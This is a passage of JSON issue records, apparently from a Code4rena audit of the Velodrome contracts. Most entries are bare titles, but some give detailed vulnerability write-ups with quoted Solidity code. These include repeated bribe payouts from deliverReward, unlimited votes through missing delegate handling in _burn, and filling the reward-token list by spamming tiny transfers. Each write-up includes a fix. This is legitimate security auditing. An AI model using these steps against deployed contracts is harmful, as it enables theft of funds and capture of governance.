"https://github.com/code-423n4/2022-05-velodrome-findings/issues/205", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/203", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/202", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/201", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/200", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/196", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/194", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/193", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/191", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/187", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Wrong calculation for the new `rewardRate[token]` can cause some of the late users can not get their rewards", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/186", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Wrong calculation for the new `rewardRate[token]` can cause some of the late users can not get their rewards"}, {"title": "Voting tokens may be lost when given to non-EOA accounts", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/185", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-05-velodrome-findings", "body": "Voting tokens may be lost when given to non-EOA accounts"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/184", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Malicious user can populate `rewards` array with tokens of their interest reaching limits of `MAX_REWARD_TOKENS`", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/182", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "sponsor confirmed"], "target": "2022-05-velodrome-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L41-L60   # Vulnerability details  ## Impact  Malicious user can populate `rewards` array with different tokens early reaching limit of `MAX_REWARD_TOKENS` sending very small amount of different tokens. It will restrict any other tokens to be used as `rewards` in [Bribe.sol#notifyRewardAmount()](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L41)  ## Proof of Concept  A custom malicious contract can be created that can make multiple calls to `notifyRewardAmount()` sending very small amounts of different tokens to populate the array `rewards` and fulfill the total of `MAX_REWARD_TOKENS` . This will restrict any other person from adding to `rewards` array.   ## Tools Used  - Manual analysis  ## Recommended Mitigation Steps  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/180", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/179", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/176", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Voting, Bribing, and Voting Phases Differ From Specification", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/175", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Voting, Bribing, and Voting Phases Differ From Specification"}, {"title": "Griefing Attack By Extending The Reward Duration", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/172", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Griefing Attack By Extending The Reward Duration"}, {"title": "Bribe Rewards Not Collected In Current Period Will Be Lost Forever", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/171", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Bribe Rewards Not Collected In Current Period Will Be Lost Forever"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/170", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Bribe Rewards Struck In Contract If Deposited During First Epoch", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/168", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Bribe Rewards Struck In Contract If Deposited During First Epoch"}, {"title": "swapping reward token problem in Gause.sol", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/167", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "swapping reward token problem in Gause.sol"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/166", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/165", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/164", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/163", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/162", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/161", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Rewards can be locked in Bribe contract because distributing them is depend of base token reward amount and Gauge.deliverBribes() is not get called always by Voter.distribute()", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/158", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor disputed"], "target": "2022-05-velodrome-findings", "body": "Rewards can be locked in Bribe contract because distributing them is depend of base token reward amount and Gauge.deliverBribes() is not get called always by Voter.distribute()"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/155", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Owner's delegates should be decreased in `_burn()`", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/153", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Owner's delegates should be decreased in `_burn()`"}, {"title": "Rewards can be locked in Gauge because of rounding error in _notifyBribeAmount() or notifyRewardAmount()", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/152", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "Rewards can be locked in Gauge because of rounding error in _notifyBribeAmount() or notifyRewardAmount()"}, {"title": "`Pair.sol#_update()` will revert when `reserve0CumulativeLast` or `reserve1CumulativeLast` gets large enough", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/148", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-05-velodrome-findings", "body": "`Pair.sol#_update()` will revert when `reserve0CumulativeLast` or `reserve1CumulativeLast` gets large enough"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/146", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/145", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/143", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Wrong reward distribution in Bribe because deliverReward() won't set tokenRewardsPerEpoch[token][epochStart] to 0 ", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/141", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-velodrome-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L83-L90   # Vulnerability details  ## Impact Function `deliverReward()` in `Bribe` contract won't set `tokenRewardsPerEpoch[token][epochStart]` to `0` after transferring rewards. `Gauge.getReward()` calls `Voter.distribute()` which calls `Gauge.deliverBribes()` which calls `Bribe.deliverReward()`. so if `Gauge.getReward()` or `Voter.distribute()` get called multiple times in same epoch then `deliverReward()` will transfer `Bribe` tokens multiple times because it doesn't set `tokenRewardsPerEpoch[token][epochStart]` to `0` after transferring.  ## Proof of Concept This is `deliverReward()` code in `Bribe`: ```   function deliverReward(address token, uint epochStart) external lock returns (uint) {     require(msg.sender == gauge);     uint rewardPerEpoch = tokenRewardsPerEpoch[token][epochStart];     if (rewardPerEpoch > 0) {       _safeTransfer(token, address(gauge), rewardPerEpoch);     }     return rewardPerEpoch;   } ``` As you can see it doesn't set `tokenRewardsPerEpoch[token][epochStart]` value to `0`, so if this function get called multiple times it will transfer epoch rewards multiple times (it will use other epoch's rewards tokens). function `Gauge.deliverBribes()` calls `Bribe.deliverReward()` and  `Gauge.deliverBribes()` is called by `Voter.distribute()` if the condition `claimable[_gauge] > DURATION` is `True`. This is those functions codes: ```     function deliverBribes() external lock {         require(msg.sender == voter);         IBribe sb = IBribe(bribe);         uint bribeStart = block.timestamp - (block.timestamp % (7 days)) + BRIBE_LAG;         uint numRewards = sb.rewardsListLength();          for (uint i = 0; i < numRewards; i++) {             address token = sb.rewards(i);             uint epochRewards = sb.deliverReward(token, bribeStart);             if (epochRewards > 0) {                 _notifyBribeAmount(token, epochRewards, bribeStart);             }         }     } ``` ```     function distribute(address _gauge) public lock {         require(isAlive[_gauge]); // killed gauges cannot distribute         uint dayCalc = block.timestamp % (7 days);         require((dayCalc < BRIBE_LAG) || (dayCalc > (DURATION + BRIBE_LAG)), \"cannot claim during votes period\");         IMinter(minter).update_period();         _updateFor(_gauge);         uint _claimable = claimable[_gauge];         if (_claimable > IGauge(_gauge).left(base) && _claimable / DURATION > 0) {             claimable[_gauge] = 0;             IGauge(_gauge).notifyRewardAmount(base, _claimable);             emit DistributeReward(msg.sender, _gauge, _claimable);             // distribute bribes & fees too             IGauge(_gauge).deliverBribes();         }     } ``` also `Gauge.getReward()` calls `Voter.getReward()`. condition `claimable[_gauge] > DURATION` in `Voter.distribute()` can be true multiple time in one epoch (`deliverBribes()` would be called multiple times) because `claimable[_gauge]` is based on `index` and `index` increase by `notifyRewardAmount()` in `Voter` anytime.  ## Tools Used VIM  ## Recommended Mitigation Steps set `tokenRewardsPerEpoch[token][epochStart]` to `0` in `deliverReward`  "}, {"title": "temporary DOS by calling notifyRewardAmount() in Bribe/Gauge with malicious tokens", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/138", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "temporary DOS by calling notifyRewardAmount() in Bribe/Gauge with malicious tokens"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/136", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/134", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/132", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/130", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Users can get unlimited votes", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/129", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-velodrome-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L517-L528   # Vulnerability details  ## Impact Users can get unlimited votes which leads to them: 1. gaining control over governance 2. getting undeserved rewards 3. having their pools favored due to gauge values  ## Proof of Concept `_mint()` calls `_moveTokenDelegates()` to set up delegation... ```solidity File: contracts/contracts/VotingEscrow.sol   #1  462       function _mint(address _to, uint _tokenId) internal returns (bool) { 463           // Throws if `_to` is zero address 464           assert(_to != address(0)); 465           // TODO add delegates 466           // checkpoint for gov 467           _moveTokenDelegates(address(0), delegates(_to), _tokenId); ``` https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L462-L467  and `_transferFrom()` calls `_moveTokenDelegates()` to transfer delegates... ```solidity File: contracts/contracts/VotingEscrow.sol   #2  301       function _transferFrom( 302           address _from, 303           address _to, 304           uint _tokenId, 305           address _sender 306       ) internal { 307           require(attachments[_tokenId] == 0 && !voted[_tokenId], \"attached\"); 308           // Check requirements 309           require(_isApprovedOrOwner(_sender, _tokenId)); 310           // Clear approval. Throws if `_from` is not the current owner 311           _clearApproval(_from, _tokenId); 312           // Remove NFT. Throws if `_tokenId` is not a valid NFT 313           _removeTokenFrom(_from, _tokenId); 314           // TODO delegates 315           // auto re-delegate 316           _moveTokenDelegates(delegates(_from), delegates(_to), _tokenId); ``` https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L301-L316  but `_burn()` does not transfer them back to `address(0)` ```solidity File: contracts/contracts/VotingEscrow.sol   #3  517       function _burn(uint _tokenId) internal { 518           require(_isApprovedOrOwner(msg.sender, _tokenId), \"caller is not owner nor approved\"); 519    520           address owner = ownerOf(_tokenId); 521    522           // Clear approval 523           approve(address(0), _tokenId); 524           // TODO add delegates 525           // Remove token 526           _removeTokenFrom(msg.sender, _tokenId); 527           emit Transfer(owner, address(0), _tokenId); 528       } ``` https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L517-L528  A user can deposit a token, lock it, wait for the lock to expire, transfer the token to another address, and repeat. During each iteration, a new NFT is minted and checkpointed. Calls to `getPastVotes()` will show the wrong values, since it will think the account still holds the delegation of the burnt NFT. Bribes and gauges also look at the checkpoints and will also have the wrong information  ## Tools Used Code inspection  ## Recommended Mitigation Steps Call `_moveTokenDelegates(owner,address(0))` in `_burn()`   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/128", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/127", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/126", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/124", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/123", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/120", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/119", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/118", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/116", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/115", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Wrong `DOMAIN_TYPEHASH` definition", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/114", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-05-velodrome-findings", "body": "Wrong `DOMAIN_TYPEHASH` definition"}, {"title": "Team emissions significantly higher than intended", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/113", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-05-velodrome-findings", "body": "Team emissions significantly higher than intended"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/109", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/108", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "NO CHECK FOR NO ZERO ADDRESS FOR `_to` in `transferFrom`", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/101", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-05-velodrome-findings", "body": "NO CHECK FOR NO ZERO ADDRESS FOR `_to` in `transferFrom`"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/100", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/99", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/98", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/97", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/96", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/95", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "WeVE (FTM) may be lost forever if redemption process is failed", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/90", "labels": ["bug", "duplicate", "2 (Med Risk)", "disagree with severity", "sponsor disputed"], "target": "2022-05-velodrome-findings", "body": "WeVE (FTM) may be lost forever if redemption process is failed"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/86", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/85", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/84", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Attacker can block LayerZero channel  ", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/83", "labels": ["bug", "3 (High Risk)", "disagree with severity"], "target": "2022-05-velodrome-findings", "body": "Attacker can block LayerZero channel  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/82", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/81", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "RedemptionSender should estimate fees to prevent failed transactions", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/80", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "RedemptionSender should estimate fees to prevent failed transactions"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/79", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Voter address needs to be validated", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/76", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Voter address needs to be validated"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/74", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}]